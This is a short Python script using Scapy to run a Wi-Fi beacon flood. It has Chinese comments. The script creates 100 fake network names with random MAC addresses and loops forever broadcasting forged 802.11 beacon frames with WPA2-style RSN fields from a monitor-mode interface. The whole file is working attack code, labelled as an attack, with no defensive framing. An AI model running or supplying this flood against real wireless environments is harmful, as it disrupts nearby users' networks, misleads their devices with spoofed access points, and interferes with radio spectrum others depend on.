from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
import random

def beacon_flood(iface):
    ssid_list = [f"FakeNetwork{i}" for i in range(100)]  # 创建 100 个虚假的 SSID
    bssid_list = [f"02:00:00:{random.randint(10, 99)}:{random.randint(10, 99)}:{random.randint(10, 99)}" for _ in range(100)]

    while True:
        for ssid, bssid in zip(ssid_list, bssid_list):
            dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
            beacon = Dot11Beacon(cap="ESS+privacy")
            essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
            rsn = Dot11Elt(ID=48, info=(b"\x01\x00"
                                        b"\x00\x0f\xac\x02"
                                        b"\x02\x00"
                                        b"\x00\x0f\xac\x04"
                                        b"\x01\x00"
                                        b"\x00\x0f\xac\x02"
                                        b"\x00\x00"))
            
            frame = RadioTap()/dot11/beacon/essid/rsn
            sendp(frame, iface=iface, count=10, inter=0.1, loop=0)  # 发送 10 个包，间隔 0.1 秒

# 启动 Beacon Flood 攻击
beacon_flood("wlan0mon")